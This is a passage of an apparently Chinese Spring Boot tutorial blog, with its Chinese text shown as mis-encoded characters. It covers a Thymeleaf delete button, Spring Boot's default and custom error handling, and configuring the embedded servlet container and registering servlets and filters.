class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-primary&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/emp/&#125;+$&#123;emp.id&#125;&quot;</span>&gt;</span>ç¼–è¾‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">th:attr</span>=<span class="string">&quot;del_uri=@&#123;/emp/&#125;+$&#123;emp.id&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-danger deleteBtn&quot;</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;.deleteBtn&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//åˆ é™¤å½“å‰å‘˜å·¥çš„</span></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;#deleteEmpForm&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;action&quot;</span>,$(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&quot;del_uri&quot;</span>)).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="7-é”™è¯¯å¤„ç†æœºåˆ¶">7ã€é”™è¯¯å¤„ç†æœºåˆ¶</span></h2><h3><span id="1-springbooté»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶">1ï¼‰ã€SpringBooté»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶</span></h3><p>é»˜è®¤æ•ˆæœï¼š</p><p>â€‹1ï¼‰ã€æµè§ˆå™¨ï¼Œè¿”å›ä¸€ä¸ªé»˜è®¤çš„é”™è¯¯é¡µé¢</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226173408.png"></p><p>  æµè§ˆå™¨å‘é€è¯·æ±‚çš„è¯·æ±‚å¤´ï¼š</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180347.png"></p><p>â€‹2ï¼‰ã€å¦‚æœæ˜¯å…¶ä»–å®¢æˆ·ç«¯ï¼Œé»˜è®¤å“åº”ä¸€ä¸ªjsonæ•°æ®</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226173527.png"></p><p>â€‹<img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180504.png"></p><p>åŸç†ï¼š</p><p>â€‹å¯ä»¥å‚ç…§ErrorMvcAutoConfigurationï¼›é”™è¯¯å¤„ç†çš„è‡ªåŠ¨é…ç½®ï¼›</p><pre><code>  ç»™å®¹å™¨ä¸­æ·»åŠ äº†ä»¥ä¸‹ç»„ä»¶</code></pre><p>â€‹1ã€DefaultErrorAttributesï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¸®æˆ‘ä»¬åœ¨é¡µé¢å…±äº«ä¿¡æ¯ï¼›</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes,</span></span><br><span class="line"><span class="params"><span class="type">boolean</span> includeStackTrace)</span> &#123;</span><br><span class="line">Map&lt;String, Object&gt; errorAttributes = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;();</span><br><span class="line">errorAttributes.put(<span class="string">&quot;timestamp&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">addStatus(errorAttributes, requestAttributes);</span><br><span class="line">addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);</span><br><span class="line">addPath(errorAttributes, requestAttributes);</span><br><span class="line"><span class="keyword">return</span> errorAttributes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹2ã€BasicErrorControllerï¼šå¤„ç†é»˜è®¤&#x2F;errorè¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicErrorController</span> <span class="keyword">extends</span> <span class="title class_">AbstractErrorController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(produces = &quot;text/html&quot;)</span><span class="comment">//äº§ç”Ÿhtmlç±»å‹çš„æ•°æ®ï¼›æµè§ˆå™¨å‘é€çš„è¯·æ±‚æ¥åˆ°è¿™ä¸ªæ–¹æ³•å¤„ç†</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">errorHtml</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">HttpServletResponse response)</span> &#123;</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">status</span> <span class="operator">=</span> getStatus(request);</span><br><span class="line">Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes(</span><br><span class="line">request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));</span><br><span class="line">response.setStatus(status.value());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//å»å“ªä¸ªé¡µé¢ä½œä¸ºé”™è¯¯é¡µé¢ï¼›åŒ…å«é¡µé¢åœ°å€å’Œé¡µé¢å†…å®¹</span></span><br><span class="line"><span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolveErrorView(request, response, status, model);</span><br><span class="line"><span class="keyword">return</span> (modelAndView == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;error&quot;</span>, model) : modelAndView);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span>    <span class="comment">//äº§ç”Ÿjsonæ•°æ®ï¼Œå…¶ä»–å®¢æˆ·ç«¯æ¥åˆ°è¿™ä¸ªæ–¹æ³•å¤„ç†ï¼›</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt; <span class="title function_">error</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">Map&lt;String, Object&gt; body = getErrorAttributes(request,</span><br><span class="line">isIncludeStackTrace(request, MediaType.ALL));</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">status</span> <span class="operator">=</span> getStatus(request);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;Map&lt;String, Object&gt;&gt;(body, status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹3ã€ErrorPageCustomizerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;error.path:/error&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/error&quot;</span>;  ç³»ç»Ÿå‡ºç°é”™è¯¯ä»¥åæ¥åˆ°errorè¯·æ±‚è¿›è¡Œå¤„ç†ï¼›ï¼ˆweb.xmlæ³¨å†Œçš„é”™è¯¯é¡µé¢è§„åˆ™ï¼‰</span><br></pre></td></tr></table></figure><p>â€‹4ã€DefaultErrorViewResolverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">resolveErrorView</span><span class="params">(HttpServletRequest request, HttpStatus status,</span></span><br><span class="line"><span class="params">Map&lt;String, Object&gt; model)</span> &#123;</span><br><span class="line"><span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolve(String.valueOf(status), model);</span><br><span class="line"><span class="keyword">if</span> (modelAndView == <span class="literal">null</span> &amp;&amp; SERIES_VIEWS.containsKey(status.series())) &#123;</span><br><span class="line">modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ModelAndView <span class="title function_">resolve</span><span class="params">(String viewName, Map&lt;String, Object&gt; model)</span> &#123;</span><br><span class="line">        <span class="comment">//é»˜è®¤SpringBootå¯ä»¥å»æ‰¾åˆ°ä¸€ä¸ªé¡µé¢ï¼Ÿ  error/404</span></span><br><span class="line"><span class="type">String</span> <span class="variable">errorViewName</span> <span class="operator">=</span> <span class="string">&quot;error/&quot;</span> + viewName;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//æ¨¡æ¿å¼•æ“å¯ä»¥è§£æè¿™ä¸ªé¡µé¢åœ°å€å°±ç”¨æ¨¡æ¿å¼•æ“è§£æ</span></span><br><span class="line"><span class="type">TemplateAvailabilityProvider</span> <span class="variable">provider</span> <span class="operator">=</span> <span class="built_in">this</span>.templateAvailabilityProviders</span><br><span class="line">.getProvider(errorViewName, <span class="built_in">this</span>.applicationContext);</span><br><span class="line"><span class="keyword">if</span> (provider != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//æ¨¡æ¿å¼•æ“å¯ç”¨çš„æƒ…å†µä¸‹è¿”å›åˆ°errorViewNameæŒ‡å®šçš„è§†å›¾åœ°å€</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(errorViewName, model);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//æ¨¡æ¿å¼•æ“ä¸å¯ç”¨ï¼Œå°±åœ¨é™æ€èµ„æºæ–‡ä»¶å¤¹ä¸‹æ‰¾errorViewNameå¯¹åº”çš„é¡µé¢   error/404.html</span></span><br><span class="line"><span class="keyword">return</span> resolveResource(errorViewName, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ­¥éª¤ï¼š</p><p>â€‹ä¸€ä½†ç³»ç»Ÿå‡ºç°4xxæˆ–è€…5xxä¹‹ç±»çš„é”™è¯¯ï¼›ErrorPageCustomizerå°±ä¼šç”Ÿæ•ˆï¼ˆå®šåˆ¶é”™è¯¯çš„å“åº”è§„åˆ™ï¼‰ï¼›å°±ä¼šæ¥åˆ°&#x2F;errorè¯·æ±‚ï¼›å°±ä¼šè¢«<strong>BasicErrorController</strong>å¤„ç†ï¼›</p><p>â€‹1ï¼‰å“åº”é¡µé¢ï¼›å»å“ªä¸ªé¡µé¢æ˜¯ç”±<strong>DefaultErrorViewResolver</strong>è§£æå¾—åˆ°çš„ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">resolveErrorView</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">      HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model)</span> &#123;</span><br><span class="line">    <span class="comment">//æ‰€æœ‰çš„ErrorViewResolverå¾—åˆ°ModelAndView</span></span><br><span class="line">   <span class="keyword">for</span> (ErrorViewResolver resolver : <span class="built_in">this</span>.errorViewResolvers) &#123;</span><br><span class="line">      <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolver.resolveErrorView(request, status, model);</span><br><span class="line">      <span class="keyword">if</span> (modelAndView != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> modelAndView;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-å¦‚æœå®šåˆ¶é”™è¯¯å“åº”">2ï¼‰ã€å¦‚æœå®šåˆ¶é”™è¯¯å“åº”ï¼š</span></h3><h4><span id="1-å¦‚ä½•å®šåˆ¶é”™è¯¯çš„é¡µé¢"><strong>1ï¼‰ã€å¦‚ä½•å®šåˆ¶é”™è¯¯çš„é¡µé¢ï¼›</strong></span></h4><p>â€‹<strong>1ï¼‰ã€æœ‰æ¨¡æ¿å¼•æ“çš„æƒ…å†µä¸‹ï¼›error&#x2F;çŠ¶æ€ç ;</strong> ã€å°†é”™è¯¯é¡µé¢å‘½åä¸º  é”™è¯¯çŠ¶æ€ç .html æ”¾åœ¨æ¨¡æ¿å¼•æ“æ–‡ä»¶å¤¹é‡Œé¢çš„ erroræ–‡ä»¶å¤¹ä¸‹ã€‘ï¼Œå‘ç”Ÿæ­¤çŠ¶æ€ç çš„é”™è¯¯å°±ä¼šæ¥åˆ°  å¯¹åº”çš„é¡µé¢ï¼›</p><p>â€‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨4xxå’Œ5xxä½œä¸ºé”™è¯¯é¡µé¢çš„æ–‡ä»¶åæ¥åŒ¹é…è¿™ç§ç±»å‹çš„æ‰€æœ‰é”™è¯¯ï¼Œç²¾ç¡®ä¼˜å…ˆï¼ˆä¼˜å…ˆå¯»æ‰¾ç²¾ç¡®çš„çŠ¶æ€ç .htmlï¼‰ï¼›</p><p>â€‹é¡µé¢èƒ½è·å–çš„ä¿¡æ¯ï¼›</p><p>â€‹timestampï¼šæ—¶é—´æˆ³</p><p>â€‹statusï¼šçŠ¶æ€ç </p><p>â€‹errorï¼šé”™è¯¯æç¤º</p><p>â€‹exceptionï¼šå¼‚å¸¸å¯¹è±¡</p><p>â€‹messageï¼šå¼‚å¸¸æ¶ˆæ¯</p><p>â€‹errorsï¼šJSR303æ•°æ®æ ¡éªŒçš„é”™è¯¯éƒ½åœ¨è¿™é‡Œ</p><p>â€‹2ï¼‰ã€æ²¡æœ‰æ¨¡æ¿å¼•æ“ï¼ˆæ¨¡æ¿å¼•æ“æ‰¾ä¸åˆ°è¿™ä¸ªé”™è¯¯é¡µé¢ï¼‰ï¼Œé™æ€èµ„æºæ–‡ä»¶å¤¹ä¸‹æ‰¾ï¼›</p><p>â€‹3ï¼‰ã€ä»¥ä¸Šéƒ½æ²¡æœ‰é”™è¯¯é¡µé¢ï¼Œå°±æ˜¯é»˜è®¤æ¥åˆ°SpringBooté»˜è®¤çš„é”™è¯¯æç¤ºé¡µé¢ï¼›</p><h4><span id="2-å¦‚ä½•å®šåˆ¶é”™è¯¯çš„jsonæ•°æ®">2ï¼‰ã€å¦‚ä½•å®šåˆ¶é”™è¯¯çš„jsonæ•°æ®ï¼›</span></h4><p>â€‹1ï¼‰ã€è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†&amp;è¿”å›å®šåˆ¶jsonæ•°æ®ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(UserNotExistException.class)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title function_">handleException</span><span class="params">(Exception e)</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;code&quot;</span>,<span class="string">&quot;user.notexist&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;message&quot;</span>,e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ²¡æœ‰è‡ªé€‚åº”æ•ˆæœ...</span></span><br></pre></td></tr></table></figure><p>â€‹2ï¼‰ã€è½¬å‘åˆ°&#x2F;errorè¿›è¡Œè‡ªé€‚åº”å“åº”æ•ˆæœå¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler(UserNotExistException.class)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">handleException</span><span class="params">(Exception e, HttpServletRequest request)</span>&#123;</span><br><span class="line">       Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       <span class="comment">//ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„é”™è¯¯çŠ¶æ€ç   4xx 5xxï¼Œå¦åˆ™å°±ä¸ä¼šè¿›å…¥å®šåˆ¶é”™è¯¯é¡µé¢çš„è§£ææµç¨‹</span></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Integer statusCode = (Integer) request</span></span><br><span class="line"><span class="comment">        .getAttribute(&quot;javax.servlet.error.status_code&quot;);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       request.setAttribute(<span class="string">&quot;javax.servlet.error.status_code&quot;</span>,<span class="number">500</span>);</span><br><span class="line">       map.put(<span class="string">&quot;code&quot;</span>,<span class="string">&quot;user.notexist&quot;</span>);</span><br><span class="line">       map.put(<span class="string">&quot;message&quot;</span>,e.getMessage());</span><br><span class="line">       <span class="comment">//è½¬å‘åˆ°/error</span></span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;forward:/error&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4><span id="3-å°†æˆ‘ä»¬çš„å®šåˆ¶æ•°æ®æºå¸¦å‡ºå»">3ï¼‰ã€å°†æˆ‘ä»¬çš„å®šåˆ¶æ•°æ®æºå¸¦å‡ºå»ï¼›</span></h4><p>å‡ºç°é”™è¯¯ä»¥åï¼Œä¼šæ¥åˆ°&#x2F;errorè¯·æ±‚ï¼Œä¼šè¢«BasicErrorControllerå¤„ç†ï¼Œå“åº”å‡ºå»å¯ä»¥è·å–çš„æ•°æ®æ˜¯ç”±getErrorAttributeså¾—åˆ°çš„ï¼ˆæ˜¯AbstractErrorControllerï¼ˆErrorControllerï¼‰è§„å®šçš„æ–¹æ³•ï¼‰ï¼›</p><p>â€‹1ã€å®Œå…¨æ¥ç¼–å†™ä¸€ä¸ªErrorControllerçš„å®ç°ç±»ã€æˆ–è€…æ˜¯ç¼–å†™AbstractErrorControllerçš„å­ç±»ã€‘ï¼Œæ”¾åœ¨å®¹å™¨ä¸­ï¼›</p><p>â€‹2ã€é¡µé¢ä¸Šèƒ½ç”¨çš„æ•°æ®ï¼Œæˆ–è€…æ˜¯jsonè¿”å›èƒ½ç”¨çš„æ•°æ®éƒ½æ˜¯é€šè¿‡errorAttributes.getErrorAttributeså¾—åˆ°ï¼›</p><p>â€‹å®¹å™¨ä¸­DefaultErrorAttributes.getErrorAttributes()ï¼›é»˜è®¤è¿›è¡Œæ•°æ®å¤„ç†çš„ï¼›</p><p>è‡ªå®šä¹‰ErrorAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç»™å®¹å™¨ä¸­åŠ å…¥æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ErrorAttributes</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyErrorAttributes</span> <span class="keyword">extends</span> <span class="title class_">DefaultErrorAttributes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes, <span class="type">boolean</span> includeStackTrace)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="built_in">super</span>.getErrorAttributes(requestAttributes, includeStackTrace);</span><br><span class="line">        map.put(<span class="string">&quot;company&quot;</span>,<span class="string">&quot;atguigu&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„æ•ˆæœï¼šå“åº”æ˜¯è‡ªé€‚åº”çš„ï¼Œå¯ä»¥é€šè¿‡å®šåˆ¶ErrorAttributesæ”¹å˜éœ€è¦è¿”å›çš„å†…å®¹ï¼Œ</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180228135513.png"></p><h2><span id="8-é…ç½®åµŒå…¥å¼servletå®¹å™¨">8ã€é…ç½®åµŒå…¥å¼Servletå®¹å™¨</span></h2><p>SpringBooté»˜è®¤ä½¿ç”¨Tomcatä½œä¸ºåµŒå…¥å¼çš„Servletå®¹å™¨ï¼›</p><p><img src="/images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180301142915.png"></p><p>é—®é¢˜ï¼Ÿ</p><h3><span id="1-å¦‚ä½•å®šåˆ¶å’Œä¿®æ”¹servletå®¹å™¨çš„ç›¸å…³é…ç½®">1ï¼‰ã€å¦‚ä½•å®šåˆ¶å’Œä¿®æ”¹Servletå®¹å™¨çš„ç›¸å…³é…ç½®ï¼›</span></h3><p>1ã€ä¿®æ”¹å’Œserveræœ‰å…³çš„é…ç½®ï¼ˆServerPropertiesã€ä¹Ÿæ˜¯EmbeddedServletContainerCustomizerã€‘ï¼‰ï¼›</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="attr">server.context-path</span>=<span class="string">/crud</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.tomcat.uri-encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//é€šç”¨çš„Servletå®¹å™¨è®¾ç½®</span></span><br><span class="line"><span class="attr">server.xxx</span></span><br><span class="line"><span class="attr">//Tomcatçš„è®¾ç½®</span></span><br><span class="line"><span class="attr">server.tomcat.xxx</span></span><br></pre></td></tr></table></figure><p>2ã€ç¼–å†™ä¸€ä¸ª<strong>EmbeddedServletContainerCustomizer</strong>ï¼šåµŒå…¥å¼çš„Servletå®¹å™¨çš„å®šåˆ¶å™¨ï¼›æ¥ä¿®æ”¹Servletå®¹å™¨çš„é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  <span class="comment">//ä¸€å®šè¦å°†è¿™ä¸ªå®šåˆ¶å™¨åŠ å…¥åˆ°å®¹å™¨ä¸­</span></span><br><span class="line"><span class="keyword">public</span> EmbeddedServletContainerCustomizer <span class="title function_">embeddedServletContainerCustomizer</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmbeddedServletContainerCustomizer</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®šåˆ¶åµŒå…¥å¼çš„Servletå®¹å™¨ç›¸å…³çš„è§„åˆ™</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(ConfigurableEmbeddedServletContainer container)</span> &#123;</span><br><span class="line">            container.setPort(<span class="number">8083</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-æ³¨å†Œservletä¸‰å¤§ç»„ä»¶servlet-filter-listener">2ï¼‰ã€æ³¨å†ŒServletä¸‰å¤§ç»„ä»¶ã€Servletã€Filterã€Listenerã€‘</span></h3><p>ç”±äºSpringBooté»˜è®¤æ˜¯ä»¥jaråŒ…çš„æ–¹å¼å¯åŠ¨åµŒå…¥å¼çš„Servletå®¹å™¨æ¥å¯åŠ¨SpringBootçš„webåº”ç”¨ï¼Œæ²¡æœ‰web.xmlæ–‡ä»¶ã€‚</p><p>æ³¨å†Œä¸‰å¤§ç»„ä»¶ç”¨ä»¥ä¸‹æ–¹å¼</p><p>ServletRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨å†Œä¸‰å¤§ç»„ä»¶</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ServletRegistrationBean <span class="title function_">myServlet</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ServletRegistrationBean</span> <span class="variable">registrationBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(<span class="keyword">new</span> <span class="title class_">MyServlet</span>(),<span class="string">&quot;/myServlet&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>FilterRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> FilterRegistrationBean <span class="title function_">myFilter</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">FilterRegistrationBean</span> <span class="variable">registrationBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">    registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">MyFilter</span>());</span><br><span class="line">    registrationBean.setUrlPatterns(Arrays.asList(<span class="string">&quot;/hello&quot;</span>,<span 